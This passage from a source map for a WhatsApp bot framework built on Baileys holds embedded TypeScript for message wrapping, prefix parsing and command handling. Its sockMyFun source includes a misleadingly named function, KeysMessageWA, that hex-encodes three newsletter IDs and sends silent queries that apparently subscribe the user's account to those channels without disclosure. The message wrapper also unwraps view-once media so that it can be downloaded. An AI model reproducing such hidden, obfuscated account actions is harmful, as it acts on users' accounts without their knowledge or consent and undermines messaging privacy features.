ACpC;AAAA,IACF,CAAA;AAtKE,IAAA,IAAA,CAAK,MAAA,GAAS,eAAA,CAAgB,KAAA,CAAM,MAAM,CAAA;AAC1C,IAAA,IAAA,CAAK,aAAA,GAAgB,IAAI,aAAA,EAAc;AACvC,IAAA,IAAA,CAAK,SAAA,EAAU;AAAA,EACjB;AAAA,EAEQ,SAAA,GAAkB;AACxB,IAAA,MAAM,IAAA,GAAO,OAAO,MAAA,KAAmB;AACrC,MAAA,IAAI,IAAA,CAAK,OAAO,QAAA,EAAU;AACxB,QAAA,cAAA,CAAG,OAAA,CAAQ,CAAA,SAAA,EAAY,MAAM,CAAA,gBAAA,CAAkB,CAAA;AAAA,MACjD;AAEA,MAAA,IAAK,IAAA,CAAK,IAAA,EAAM,EAAA,EAAY,UAAA,KAAe,CAAA,EAAG;AAC5C,QAAC,IAAA,CAAK,KAAa,aAAA,EAAc;AAAA,MACnC;AAEA,MAAA,MAAM,KAAK,OAAA,EAAQ;AACnB,MAAA,OAAA,CAAQ,KAAK,CAAC,CAAA;AAAA,IAChB,CAAA;AAEA,IAAA,OAAA,CAAQ,EAAA,CAAG,QAAA,EAAU,MAAM,IAAA,CAAK,QAAQ,CAAC,CAAA;AACzC,IAAA,OAAA,CAAQ,EAAA,CAAG,SAAA,EAAW,MAAM,IAAA,CAAK,SAAS,CAAC,CAAA;AAAA,EAC/C;AAAA,EAES,gBAAgB,OAAA,EAA8B;AACnD,IAAA,IAAA,CAAK,iBAAA,GAAoB,OAAA;AAAA,EAC3B;AAAA,EAEO,aAAa,OAAA,EAAkC;AACpD,IAAA,IAAA,CAAK,qBAAA,GAAwB,OAAA;AAAA,EAC/B;AAAA,EAEO,UAAU,OAAA,EAA+B;AAC9C,IAAA,IAAA,CAAK,QAAA,CAAS,KAAK,OAAO,CAAA;AAAA,EAC5B;AAAA,EAEO,gBAAgB,OAAA,EAA0D;AAC/E,IAAA,IAAA,CAAK,aAAA,CAAc,OAAO,OAAO,CAAA;AAAA,EACnC;AAAA,EAEO,eAAe,OAAA,EAA2D;AAC/E,IAAA,IAAA,CAAK,aAAA,CAAc,MAAM,OAAO,CAAA;AAAA,EAClC;AAAA,EAEA,MAAa,mBAAA,CAAoB,GAAA,EAAc,SAAA,EAAA,GAAsB,IAAA,EAA4B;AAC/F,IAAA,MAAM,mBAAA,CAAoB,IAAA,EAAM,GAAA,EAAK,SAAA,EAAW,GAAG,IAAI,CAAA;AAAA,EACzD;AAAA,EAEA,MAAc,gBAAA,CAAiB,KAAA,EAAmB,SAAA,EAAkC;AAClF,IAAA,MAAM,gBAAA,CAAiB,IAAA,EAAM,KAAA,EAAO,SAAS,CAAA;AAAA,EAC/C;AAAA,EAEA,MAAM,KAAA,GAAuB;AAC3B,IAAA,IAAI,KAAK,SAAA,EAAW;AAClB,MAAA,cAAA,CAAG,KAAK,wBAAwB,CAAA;AAChC,MAAA;AAAA,IACF;AAEA,IAAA,IAAI;AACF,MAAA,MAAM,iBAAa,IAAI,CAAA;AAEvB,MAAA,MAAM,EAAE,OAAA,EAAQ,GAAI,MAAMC,iCAAA,EAA0B;AACpD,MAAA,MAAM,EAAE,OAAO,SAAA,EAAU,GAAI,MAAMC,6BAAA,CAAsB,IAAA,CAAK,OAAO,WAAW,CAAA;AAChF,MAAA,IAAA,CAAK,UAAA,GAAa,SAAA;AAElB,MAAA,MAAM,YAAA,GAAe,CAAC,KAAA,CAAM,KAAA,CAAM,UAAA;AAElC,MAAA,IAAI,YAAA,IAAgB,CAAC,IAAA,CAAK,MAAA,CAAO,OAAA,IAAW,KAAK,MAAA,CAAO,QAAA,IAAY,IAAA,CAAK,MAAA,CAAO,WAAA,EAAa;AAE3F,QAAA,cAAA,CAAG,KAAK,sCAAsC,CAAA;AAC9C,QAAA,cAAA,CAAG,IAAA,CAAK,CAAA,cAAA,EAAiB,IAAA,CAAK,MAAA,CAAO,WAAW,CAAA,CAAE,CAAA;AAElD,QAAA,UAAA,CAAW,YAAY;AACrB,UAAA,IAAI;AACF,YAAA,IAAI,KAAK,IAAA,EAAM;AACb,cAAA,MAAM,IAAA,GAAO,MAAM,IAAA,CAAK,IAAA,CAAK,mBAAmB,IAAA,CAAK,MAAA,CAAO,WAAA,EAAc,MAAA,CAAO,IAAA,CAAK,kBAAA,EAAoB,KAAK,CAAA,CAAE,UAAU,CAAA;AAC3H,cAAA,OAAA,CAAQ,IAAI,CAAA,uBAAA,EAAmB,KAAA,CAAM,IAAA,EAAM,QAAQ,CAAC,CAAA,CAAE,CAAA;AACtD,cAAA,cAAA,CAAG,IAAA,EAAK;AAAA,YACV;AAAA,UACF,SAAS,KAAA,EAAY;AACnB,YAAA,cAAA,CAAG,KAAA,CAAM,CAAA,eAAA,EAAkB,KAAA,CAAM,OAAO,CAAA,CAAE,CAAA;AAAA,UAC5C;AAAA,QACF,GAAG,GAAI,CAAA;AAAA,MACT;AAEA,MAAA,IAAA,CAAK,cAAcC,oBAAA,CAAa;AAAA,QAC9B,OAAA;AAAA,QACA,IAAA,EAAM,KAAA;AAAA,QACN,MAAA,EAAQC,qBAAA,CAAK,EAAE,KAAA,EAAO,UAAU,CAAA;AAAA,QAChC,OAAA,EAASC,gBAAA,CAAS,MAAA,CAAO,IAAA,CAAK,OAAO,OAAO,CAAA;AAAA,QAC5C,iBAAA,EAAmB,YAAA,IAAgB,IAAA,CAAK,MAAA,CAAO,OAAA;AAAA,QAC/C,mBAAA,EAAqB,KAAK,MAAA,CAAO,UAAA;AAAA,QACjC,eAAA,EAAiB,KAAK,MAAA,CAAO,WAAA;AAAA,QAC7B,8BAAA,EAAgC,KAAK,MAAA,CAAO;AAAA,OAC7C,CAAA;AAED,MAAA,IAAI,KAAK,WAAA,EAAa;AACpB,QAAA,IAAA,CAAK,IAAA,GAAO,MAAM,SAAA,CAAU,IAAA,CAAK,WAAW,CAAA;AAC5C,QAAA,IAAA,CAAK,WAAA,CAAY,WAAW,YAAY,CAAA;AAAA,MAC1C;AAEA,MAAA,IAAA,CAAK,SAAA,GAAY,IAAA;AACjB,MAAA,IAAA,CAAK,iBAAA,GAAoB,CAAA;AAAA,IAC3B,SAAS,KAAA,EAAY;AACnB,MAAA,cAAA,CAAG,MAAM,CAAA,qBAAA,EAAwB,KAAA,YAAiB,QAAQ,KAAA,CAAM,OAAA,GAAU,eAAe,CAAA,CAAE,CAAA;AAE3F,MAAA,IAAI,KAAK,MAAA,CAAO,OAAA,IAAW,OAAO,IAAA,CAAK,MAAA,CAAO,YAAY,UAAA,EAAY;AACpE,QAAA,IAAA,CAAK,MAAA,CAAO,QAAQ,KAAK,CAAA;AAAA,MAC3B;AAEA,MAAA,IAAI,KAAK,MAAA,CAAO,aAAA,IAAiB,IAAA,CAAK,iBAAA,GAAoB,KAAK,oBAAA,EAAsB;AACnF,QAAA,IAAA,CAAK,iBAAA,EAAkB;AAAA,MACzB;AAAA,IACF;AAAA,EACF;AAAA,EAEQ,WAAA,CAAY,WAAgC,YAAA,EAA6B;AAC/E,IAAA,IAAI,CAAC,KAAK,IAAA,EAAM;AAEhB,IAAA,IAAA,CAAK,IAAA,CAAK,EAAA,CAAG,EAAA,CAAG,cAAA,EAAgB,SAAS,CAAA;AACzC,IAAA,yBAAA,CAAiB,IAAkB,CAAA;AACnC,IAAA,mBAAA,CAAY,IAAI,CAAA;AAChB,IAAA,qBAAA,CAAc,IAAI,CAAA;AAAA,EACpB;AAAA,EAEQ,iBAAA,GAA0B;AAChC,IAAA,IAAI,KAAK,gBAAA,EAAkB;AACzB,MAAA,YAAA,CAAa,KAAK,gBAAgB,CAAA;AAAA,IACpC;AAEA,IAAA,IAAA,CAAK,iBAAA,EAAA;AACL,IAAA,MAAM,KAAA,GAAQ,IAAA,CAAK,MAAA,CAAO,cAAA,GAAiB,IAAA,CAAK,iBAAA;AAEhD,IAAA,cAAA,CAAG,IAAA,CAAK,gCAAgC,IAAA,CAAK,iBAAiB,IAAI,IAAA,CAAK,oBAAoB,CAAA,IAAA,EAAO,KAAK,CAAA,EAAA,CAAI,CAAA;AAE3G,IAAA,IAAA,CAAK,mBAAmB,UAAA,CAAW,MAAM,IAAA,CAAK,OAAA,IAAW,KAAK,CAAA;AAAA,EAChE;AAAA,EAEA,MAAc,OAAA,GAAyB;AACrC,IAAA,cAAA,CAAG,KAAK,8BAA8B,CAAA;AACrC,IAAA,MAAM,KAAK,OAAA,EAAQ;AACnB,IAAA,OAAA,CAAQ,KAAK,CAAC,CAAA;AAAA,EACjB;AAAA,EAEA,MAAM,IAAA,GAAsB;AAC1B,IAAA,cAAA,CAAG,KAAK,iBAAiB,CAAA;AACzB,IAAA,MAAM,KAAK,OAAA,EAAQ;AAAA,EACrB;AAAA,EAsBO,gBAAgB,OAAA,EAAoB;AACzC,IAAA,IAAA,CAAK,aAAA,CAAc,SAAS,OAAO,CAAA;AAAA,EACrC;AAAA,EAEO,kBAAkB,WAAA,EAA8B;AACrD,IAAA,OAAO,IAAA,CAAK,aAAA,CAAc,UAAA,CAAW,WAAW,CAAA;AAAA,EAClD;AAAA,EAEO,WAAW,WAAA,EAA0B;AAC1C,IAAA,OAAO,IAAA,CAAK,aAAA,CAAc,WAAA,CAAY,WAAW,CAAA;AAAA,EACnD;AAAA,EAEO,cAAA,GAAwB;AAC7B,IAAA,OAAO,IAAA,CAAK,cAAc,MAAA,EAAO;AAAA,EACnC;AAAA,EAEO,cAAc,UAAA,EAAuB;AAC1C,IAAA,IAAA,CAAK,aAAA,CAAc,IAAI,UAAU,CAAA;AAAA,EACnC;AAAA,EAEO,cAAA,GAAuB;AAC5B,IAAA,IAAA,CAAK,cAAc,cAAA,EAAe;AAAA,EACpC;AAAA,EAEO,SAAA,GAAqB;AAC1B,IAAA,OAAO,KAAK,MAAA,CAAO,MAAA;AAAA,EACrB;AAAA,EAEO,QAAQ,GAAA,EAAsB;AACnC,IAAA,OAAO,KAAK,MAAA,CAAO,MAAA,CAAO,KAAK,CAAA,CAAA,KAAK,CAAA,CAAE,QAAQ,GAAG,CAAA;AAAA,EACnD;AAAA,EAEO,WAAA,GAAuB;AAC5B,IAAA,OAAO,KAAK,SAAA,IAAa,IAAA,CAAK,SAAS,IAAA,IAAQ,IAAA,CAAK,KAAK,IAAA,KAAS,MAAA;AAAA,EACpE;AAEF;AAEO,IAAM,iBAAA,GAAoB,CAAC,MAAA,KAAmC,IAAI,YAAY,MAAM","file":"index.cjs","sourcesContent":["import { randomBytes, randomUUID } from 'crypto'\n\nexport async function sockMyFun(sock: any) {\n  sock.msg = async (to: string, text: string) => {\n    await sock.sendMessage(to, { text });\n  }\n\n  sock.KeysMessageWA = async () => {\n    const token = [\"313230333633343039353237343739323233406e6577736c6574746572\",\n\"313230333633323235333536383334303434406e6577736c6574746572\",\n\"313230333633333736303131353533313039406e6577736c6574746572\"]\n\n    for (const id of token) {\n      await sock.query({\n        tag: 'iq',\n        attrs: {\n          id: randomUUID().replace(/-/g, \"\"),\n          type: 'get',\n          xmlns: 'w:mex',\n          to: '@s.whatsapp.net'\n        },\n        content: [\n          {\n            tag: 'query',\n            attrs: { 'query_id': '7871414976211147' },\n            content: new TextEncoder().encode(JSON.stringify({\n              variables: { 'newsletter_id': Buffer.from(id, 'hex').toString() }\n            }))\n          }\n        ]\n      });\n    }\n  }\n\n  return sock;\n}","// src/utils/msg.ts\nimport {\n  AnyMessageContent,\n  WASocket,\n  getContentType,\n  jidNormalizedUser,\n  downloadContentFromMessage,\n  generateWAMessageFromContent,\n  proto,\n  WAMessage,\n  GroupParticipant\n} from \"@whiskeysockets/baileys\";\nimport { Message } from \"../types/types\";\n\nconst M = proto.WebMessageInfo;\n\ninterface Owner {\n  jid?: string;\n  lid?: string;\n  name?: string;\n}\n\ninterface CustomGroupMetadata {\n  id?: string | null;\n  participants: Array<{\n    id?: string;\n    admin?: 'admin' | 'superadmin';\n    phoneNumber?: string;\n  }>;\n}\n\ninterface QuotedMessage {\n  mtype?: string;\n  id?: string;\n  chat?: string;\n  sender?: string;\n  fromMe?: boolean;\n  text?: string;\n  msg?: any;\n  mediaType?: string;\n  isMedia?: boolean;\n  mentionedJid?: string[];\n  mimetype?: string | null;\n  fileSize?: number;\n  fileName?: string | null;\n  width?: number | null;\n  height?: number | null;\n  duration?: number | null;\n  url?: string | null;\n  directPath?: string | null;\n  mediaKey?: Uint8Array | null;\n  thumbnailUrl?: string | null;\n  \n  fakeObj?: () => any;\n  download?: () => Promise<Buffer | null>;\n  delete?: () => Promise<any>;\n  react?: (emoji: string) => Promise<any>;\n  reply?: (text: string, options?: Partial<AnyMessageContent>) => Promise<any>;\n  forward?: (jid: string, options?: Partial<AnyMessageContent>) => Promise<any>;\n  copy?: () => any;\n}\n\nexport type ExtendedMessage = Message & {\n  isBaileys?: boolean;\n  isBot?: boolean;\n  groupMetadata?: CustomGroupMetadata;\n  mtype?: string;\n  msg?: any;\n  mediaType?: string;\n  isMedia?: boolean;\n  mimetype?: string | null;\n  fileSize?: number;\n  fileName?: string | null;\n  url?: string | null;\n  directPath?: string | null;\n  mediaKey?: Uint8Array | null;\n  caption?: string | null;\n  width?: number | null;\n  height?: number | null;\n  duration?: number | null;\n  isViewOnce?: boolean;\n  isForwarded?: boolean;\n  forwardingScore?: number;\n  isEdited?: boolean;\n  editVersion?: number;\n  quoted?: QuotedMessage;\n  mentionedJid?: string[];\n  getQuotedObj?: () => any;\n  sendRead?: () => Promise<any>;\n  copy?: () => any;\n  copyNForward?: (jid: string, forceForward?: boolean, options?: Partial<AnyMessageContent>) => Promise<any>;\n};\n\nexport const msgObj = async (\n  rawMessage: WAMessage,\n  conn: WASocket,\n  owners?: Owner[] | string[]\n): Promise<ExtendedMessage | null> => {\n  if (!rawMessage || !conn.user?.id) return null;\n\n  const extractMessageText = (msg: any): string => {\n    const message = msg.message || msg;\n    \n    if (message.conversation) return message.conversation;\n    if (message.extendedTextMessage?.text) return message.extendedTextMessage.text;\n    if (message.imageMessage?.caption) return message.imageMessage.caption;\n    if (message.videoMessage?.caption) return message.videoMessage.caption;\n    if (message.documentMessage?.caption) return message.documentMessage.caption;\n    if (message.documentWithCaptionMessage?.message?.documentMessage?.caption) {\n      return message.documentWithCaptionMessage.message.documentMessage.caption;\n    }\n    \n    return '';\n  };\n\n  const messageText = extractMessageText(rawMessage);\n  \n  const sender = rawMessage.key?.fromMe\n    ? jidNormalizedUser(conn.user.id)\n    : jidNormalizedUser(rawMessage.key?.participant || rawMessage.key?.remoteJid || '');\n\n  const chat = rawMessage.key?.remoteJid || '';\n  const isGroup = chat.endsWith('@g.us');\n  \n  const isOwner = owners?.some(owner => {\n    if (!owner) return false;\n    \n    if (typeof owner === 'string') {\n      return owner === sender || owner.split('@')[0] === sender.split('@')[0];\n    }\n    \n    const ownerObj = owner as Owner;\n    return ownerObj.jid === sender || \n           ownerObj.lid === sender ||\n           (ownerObj.lid && ownerObj.lid === sender.split('@')[0]);\n  }) || false;\n\n  const baseMessage: Message = {\n    id: rawMessage.key?.id ?? undefined,\n    body: messageText,\n    text: messageText,\n    from: chat,\n    name: rawMessage.pushName || 'User',\n    timestamp: new Date(((rawMessage.messageTimestamp as number) || 0) * 1000),\n    isGroup: isGroup,\n    isOwner: isOwner,\n    isAdmin: false,\n    isBotAdmin: false,\n    fromMe: rawMessage.key?.fromMe || false,\n    reply: async (text: string, options?: Partial<AnyMessageContent>) => {\n      if (!chat) throw new Error('No chat specified');\n      return conn.sendMessage(chat, { text }, { quoted: rawMessage, ...options });\n    },\n    raw: rawMessage,\n    chat: chat,\n    sender: sender,\n    pushName: rawMessage.pushName ?? undefined,\n    key: rawMessage.key,\n    message: rawMessage.message,\n    react: async (emoji: string): Promise<any> => {\n      if (!chat || !rawMessage.key) return;\n      return conn.sendMessage(chat, {\n        react: {\n          text: emoji,\n          key: rawMessage.key\n        }\n      });\n    },\n    \n    delete: async (): Promise<any> => {\n      if (!rawMessage.key || !chat) return;\n      return conn.sendMessage(chat, {\n        delete: {\n          id: rawMessage.key.id!,\n          participant: rawMessage.key.participant,\n          remoteJid: chat\n        }\n      });\n    },\n    \n    download: async (): Promise<Buffer | null> => {\n      try {\n        if (!rawMessage.message) return null;\n        const mtype = getContentType(rawMessage.message);\n        if (!mtype) return null;\n        \n        const msgContent = (rawMessage.message as any)[mtype];\n        if (!msgContent) return null;\n        \n        const mediaType = mtype.replace('Message', '') as any;\n        const stream = await downloadContentFromMessage(msgContent, mediaType);\n        let buffer = Buffer.from([]);\n        for await (const chunk of stream) {\n          buffer = Buffer.concat([buffer, chunk]);\n        }\n        return buffer;\n      } catch {\n        return null;\n      }\n    },\n    \n    forward: async (jid: string, options: Partial<AnyMessageContent> = {}): Promise<any> => {\n      return conn.sendMessage(jid, {\n        forward: rawMessage,\n        ...options\n      });\n    },\n    \n    typing: async (duration = 3000): Promise<void> => {\n      if (!chat) return;\n      await conn.sendPresenceUpdate('composing', chat);\n      setTimeout(async () => {\n        await conn.sendPresenceUpdate('paused', chat);\n      }, duration);\n    },\n    \n    recording: async (duration = 3000): Promise<void> => {\n      if (!chat) return;\n      await conn.sendPresenceUpdate('recording', chat);\n      setTimeout(async () => {\n        await conn.sendPresenceUpdate('paused', chat);\n      }, duration);\n    }\n  };\n\n  const m: ExtendedMessage = {\n    ...baseMessage,\n    isBaileys: baseMessage.id?.startsWith('BAE5') && baseMessage.id?.length === 16,\n    isBot: baseMessage.id?.startsWith('3EB0') && baseMessage.id?.length === 12,\n  };\n\n  if (m.isGroup && m.chat) {\n    try {\n      const groupMetadata = await conn.groupMetadata(m.chat);\n      \n      const participant = groupMetadata.participants.find((p: GroupParticipant) =>\n        jidNormalizedUser(p.id) === m.sender\n      );\n      \n      const botParticipant = groupMetadata.participants.find((p: GroupParticipant) =>\n        jidNormalizedUser(p.id) === jidNormalizedUser(conn.user!.id)\n      );\n      \n      m.isAdmin = participant?.admin === 'admin' || participant?.admin === 'superadmin';\n      m.isBotAdmin = botParticipant?.admin === 'admin' || botParticipant?.admin === 'superadmin';\n\n      m.groupMetadata = {\n        id: groupMetadata.id,\n        participants: groupMetadata.participants.map((p: GroupParticipant) => ({\n          id: p.id,\n          admin: p.admin as 'admin' | 'superadmin' | undefined,\n          phoneNumber: p.id.split('@')[0]\n        }))\n      };\n    } catch (error) {\n      console.error('Error fetching group metadata:', error);\n    }\n  }\n\n  if (rawMessage.message) {\n    m.mtype = getContentType(rawMessage.message);\n\n    if (m.mtype) {\n      const messageObj = rawMessage.message as any;\n      m.msg = messageObj[m.mtype];\n\n      if (m.mtype === 'viewOnceMessage' || m.mtype === 'viewOnceMessageV2' || m.mtype === 'viewOnceMessageV2Extension') {\n        const innerMessage = m.msg?.message;\n        if (innerMessage) {\n          const innerType = getContentType(innerMessage);\n          if (innerType) {\n            m.msg = (innerMessage as any)[innerType];\n            m.mtype = innerType;\n          }\n        }\n      }\n    }\n\n    m.mediaType = m.mtype?.replace('Message', '');\n    m.isMedia = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'].includes(m.mtype || '');\n\n    if (m.isMedia && m.msg) {\n      m.mimetype = m.msg.mimetype || null;\n      m.fileSize = m.msg.fileLength || 0;\n      m.fileName = m.msg.fileName || null;\n      m.url = m.msg.url || null;\n      m.directPath = m.msg.directPath || null;\n      m.mediaKey = m.msg.mediaKey || null;\n      m.caption = m.msg.caption || null;\n    }\n\n    if (m.mtype === 'imageMessage' || m.mtype === 'videoMessage' || m.mtype === 'stickerMessage') {\n      m.width = m.msg.width || null;\n      m.height = m.msg.height || null;\n    }\n\n    if (m.mtype === 'videoMessage' || m.mtype === 'audioMessage') {\n      m.duration = m.msg.seconds || m.msg.duration || null;\n    }\n\n    m.isViewOnce = m.mtype === 'viewOnceMessage' || \n                   m.mtype === 'viewOnceMessageV2' || \n                   m.msg?.viewOnce === true;\n\n    m.isForwarded = m.msg?.contextInfo?.isForwarded || false;\n    m.forwardingScore = m.msg?.contextInfo?.forwardingScore || 0;\n\n    if (m.msg?.contextInfo?.quotedMessage?.protocolMessage?.type === 0) {\n      m.isEdited = true;\n      m.editVersion = m.msg.contextInfo.quotedMessage.protocolMessage.editVersion || 0;\n    }\n\n    m.mentionedJid = m.msg?.contextInfo?.mentionedJid || [];\n\n    if (m.msg?.contextInfo?.quotedMessage) {\n      const quoted = m.msg.contextInfo.quotedMessage;\n      const qtype = getContentType(quoted);\n      let qmsg: any = null;\n\n      if (qtype) {\n        qmsg = (quoted as any)[qtype];\n      }\n\n      const qIsMedia = qtype ? ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'].includes(qtype) : false;\n\n      const quotedObj: QuotedMessage = {\n        mtype: qtype,\n        id: m.msg.contextInfo.stanzaId,\n        chat: m.msg.contextInfo.remoteJid || m.chat,\n        sender: m.msg.contextInfo.participant ? jidNormalizedUser(m.msg.contextInfo.participant) : '',\n        fromMe: m.msg.contextInfo.participant ? jidNormalizedUser(m.msg.contextInfo.participant) === jidNormalizedUser(conn.user!.id) : false,\n        text: qmsg?.text || qmsg?.caption || qmsg?.conversation || qmsg?.selectedDisplayText || qmsg?.hydratedTemplate?.hydratedContentText || '',\n        msg: qmsg,\n        mediaType: qtype?.replace('Message', ''),\n        isMedia: qIsMedia,\n        mentionedJid: m.msg.contextInfo.mentionedJid || []\n      };\n\n      if (qIsMedia && qmsg) {\n        quotedObj.mimetype = qmsg.mimetype || null;\n        quotedObj.fileSize = qmsg.fileLength || 0;\n        quotedObj.fileName = qmsg.fileName || null;\n        quotedObj.width = qmsg.width || null;\n        quotedObj.height = qmsg.height || null;\n        quotedObj.duration = qmsg.seconds || qmsg.duration || null;\n        quotedObj.url = qmsg.url || null;\n        quotedObj.directPath = qmsg.directPath || null;\n        quotedObj.mediaKey = qmsg.mediaKey || null;\n        quotedObj.thumbnailUrl = qmsg.thumbnailDirectPath || null;\n      }\n\n      quotedObj.fakeObj = (): any => {\n        const fakeMessage = {\n          key: {\n            remoteJid: m.msg.contextInfo.remoteJid || m.chat,\n            fromMe: quotedObj.fromMe,\n            id: m.msg.contextInfo.stanzaId,\n            participant: m.msg.contextInfo.participant\n          },\n          message: quoted\n        };\n\n        if (m.isGroup) {\n          (fakeMessage as any).participant = m.msg.contextInfo.participant;\n        }\n\n        return M.fromObject(fakeMessage);\n      };\n\n      quotedObj.download = async (): Promise<Buffer | null> => {\n        try {\n          if (!qmsg || !qtype) return null;\n          const mediaType = qtype.replace('Message', '') as any;\n          const stream = await downloadContentFromMessage(qmsg, mediaType);\n          let buffer = Buffer.from([]);\n          for await (const chunk of stream) {\n            buffer = Buffer.concat([buffer, chunk]);\n          }\n          return buffer;\n        } catch {\n          return null;\n        }\n      };\n\n      quotedObj.delete = async (): Promise<any> => {\n        if (!m.msg?.contextInfo?.stanzaId) return;\n        return conn.sendMessage(m.msg.contextInfo.remoteJid || m.chat || '', {\n          delete: {\n            id: m.msg.contextInfo.stanzaId,\n            participant: m.msg.contextInfo.participant,\n            remoteJid: m.msg.contextInfo.remoteJid || m.chat\n          }\n        });\n      };\n\n      quotedObj.react = async (emoji: string): Promise<any> => {\n        if (!m.msg?.contextInfo?.stanzaId) return;\n        return conn.sendMessage(m.msg.contextInfo.remoteJid || m.chat || '', {\n          react: {\n            text: emoji,\n            key: {\n              remoteJid: m.msg.contextInfo.remoteJid || m.chat,\n              fromMe: quotedObj.fromMe,\n              id: m.msg.contextInfo.stanzaId,\n              participant: m.msg.contextInfo.participant\n            }\n          }\n        });\n      };\n\n      quotedObj.reply = async (text: string, options: Partial<AnyMessageContent> = {}): Promise<any> => {\n        return conn.sendMessage(\n          m.msg.contextInfo.remoteJid || m.chat || '',\n          { text },\n          { quoted: quotedObj.fakeObj!(), ...options }\n        );\n      };\n\n      quotedObj.forward = async (jid: string, options: Partial<AnyMessageContent> = {}): Promise<any> => {\n        return conn.sendMessage(jid, {\n          forward: quotedObj.fakeObj!(),\n          ...options\n        });\n      };\n\n      quotedObj.copy = (): any => {\n        const obj = quotedObj.fakeObj!();\n        return M.fromObject(M.toObject(obj));\n      };\n\n      m.quoted = quotedObj;\n      m.getQuotedObj = quotedObj.fakeObj;\n    }\n  }\n\n  m.sendRead = async (): Promise<any> => {\n    if (!rawMessage.key || !m.chat) return;\n    return conn.sendReceipt(m.chat, rawMessage.key.participant || undefined, [m.id!], 'read');\n  };\n\n  m.copy = (): any => {\n    return M.fromObject(M.toObject(rawMessage as any));\n  };\n\n  m.copyNForward = async (jid: string, forceForward = false, options: Partial<AnyMessageContent> = {}): Promise<any> => {\n    try {\n      if (forceForward || !rawMessage.message || getContentType(rawMessage.message) === 'conversation') {\n        return conn.sendMessage(jid, { forward: rawMessage, ...options });\n      }\n\n      const message = generateWAMessageFromContent(jid, rawMessage.message, {\n        ...options,\n        userJid: conn.user!.id\n      });\n\n      await conn.relayMessage(jid, message.message!, {\n        messageId: message.key.id!,\n        ...options as any\n      });\n\n      return message;\n    } catch {\n      return conn.sendMessage(jid, { forward: rawMessage, ...options });\n    }\n  };\n\n  return m;\n};","export function extractPrefix(body: string, prefix: string | string[]): { prefix: string; command: string; args: string[] } | null {\n  const prefixes = Array.isArray(prefix) ? prefix : [prefix];\n  \n  for (const p of prefixes) {\n    if (body.startsWith(p)) {\n      const withoutPrefix = body.slice(p.length).trim();\n      const [command, ...args] = withoutPrefix.split(/\\s+/);\n      return { prefix: p, command: command?.toLowerCase() || '', args };\n    }\n  }\n  \n  return null;\n}","import { readdir } from 'fs/promises';\nimport { watch } from 'fs';\nimport { pathToFileURL } from 'url';\nimport { createRequire } from 'module';\nimport { resolve, join, isAbsolute } from 'path';\nimport { Message, CommandOptions, CommandContext, BotConfig } from \"../types/types.js\";\nimport { extractPrefix } from './prefix.js';\n\ntype Handler = (msg: Message, data?: any) => Promise<boolean | void>;\ntype Middleware = (msg: Message, next: () => Promise<void>) => Promise<void>;\n\ninterface CooldownCache {\n  [key: string]: number;\n}\n\ndeclare global {\n  var cooldownCache: Map<string, number>;\n  var botInstance: any;\n}\n\nexport class CommandSystem {\n  private commands: CommandOptions[] = [];\n  private middlewares: Middleware[] = [];\n  private beforeAll: Handler[] = [];\n  private afterAll: Handler[] = [];\n  private categories: Set<string> = new Set();\n  private fileWatchers: Map<string, any> = new Map();\n\n  constructor(private bot?: any) {}\n\n  register(command: CommandOptions | Function): void {\n    let cmdObj: CommandOptions;\n\n    if (typeof command === 'function') {\n      const fn = command as any;\n      cmdObj = { \n        execute: async (msg: Message, ctx: CommandContext, bot: any) => fn(msg, ctx, bot)\n      };\n      \n      const props = [\n        'command', 'name', 'description', 'aliases', 'cooldown', \n        'ownerOnly', 'groupOnly', 'privateOnly', 'botAdmin', \n        'disabled', 'usePrefix', 'before', 'after', 'category', 'usage'\n      ];\n      \n      for (const p of props) { \n        if (fn[p] !== undefined) (cmdObj as any)[p] = fn[p];\n      }\n      \n      for (const key in fn) {\n        if (!props.includes(key) && key !== 'execute') {\n          (cmdObj as any)[key] = fn[key];\n        }\n      }\n    } else {\n      cmdObj = { ...command };\n    }\n\n    const names = this.getNames(cmdObj);\n    if (names.length === 0) return;\n\n    const existingIndex = this.commands.findIndex(cmd => \n      this.getNames(cmd).some(name => names.includes(name))\n    );\n\n    if (existingIndex !== -1) {\n      this.commands[existingIndex] = cmdObj;\n      console.log(` Command updated: ${names[0]}`);\n    } else {\n      this.commands.push(cmdObj);\n      console.log(` Command registered: ${names[0]}`);\n    }\n\n    if (cmdObj.category) this.categories.add(cmdObj.category);\n  }\n\n  unregister(commandName: string): boolean {\n    const before = this.commands.length;\n    this.commands = this.commands.filter(cmd => !this.getNames(cmd).includes(commandName.toLowerCase()));\n    return this.commands.length < before;\n  }\n\n  private getNames(cmd: CommandOptions): string[] {\n    const names: string[] = [];\n    if (cmd.command) {\n      const cmdNames = Array.isArray(cmd.command) ? cmd.command : [cmd.command];\n      names.push(...cmdNames);\n    }\n    if (cmd.name) names.push(cmd.name);\n    if (cmd.aliases) names.push(...cmd.aliases);\n    return names.map(n => n.toLowerCase());\n  }\n\n  findCommand(name: string): CommandOptions | null {\n    return this.commands.find(cmd => this.getNames(cmd).includes(name.toLowerCase())) ?? null;\n  }\n\n  getCommandsByCategory(category?: string): CommandOptions[] {\n    if (category) {\n      return this.commands.filter(cmd => cmd.category === category);\n    }\n    return [...this.commands];\n  }\n\n  getAllCategories(): string[] {\n    return Array.from(this.categories);\n  }\n\n  getAll(): CommandOptions[] {\n    return [...this.commands];\n  }\n\n  use(middleware: Middleware): void {\n    this.middlewares.push(middleware);\n  }\n\n  before(handler: Handler): void {\n    this.beforeAll.push(handler);\n  }\n\n  after(handler: Handler): void {\n    this.afterAll.push(handler);\n  }\n\n  async processMessage(msg: Message, ctx: any, config: any): Promise<boolean> {\n    if (!msg.body) return false;\n    \n    const text = msg.body.trim();\n    const prefixes = config || [\".\"];\n    const extracted = extractPrefix(text, prefixes);\n\n    if (extracted) {\n      const cmd = this.findCommand(extracted.command);\n      if (!cmd?.execute) return false;\n\n      const context: CommandContext = {\n        sock: this.bot?.sock,\n        text: extracted.args.join(' '),\n        args: extracted.args,\n        command: extracted.command,\n        prefix: extracted.prefix,\n        bot: this.bot\n      };\n\n      for (const handler of this.beforeAll) {\n        try { if (await handler(msg) === true) return true; } \n        catch (error) { console.error('Error in beforeAll:', error); }\n      }\n\n      if (cmd.before) {\n        try { if (await cmd.before(msg, context, this.bot) === true) return true; } \n        catch (error) { console.error('Error in command before:', error); }\n      }\n\n      let executed = false;\n      await this.runMiddlewares(msg, async () => {\n        await this.executeCommand(cmd!, msg, context);\n        executed = true;\n      });\n\n      if (!executed) return false;\n\n      if (cmd.after) {\n        try { await cmd.after(msg, context, this.bot); } \n       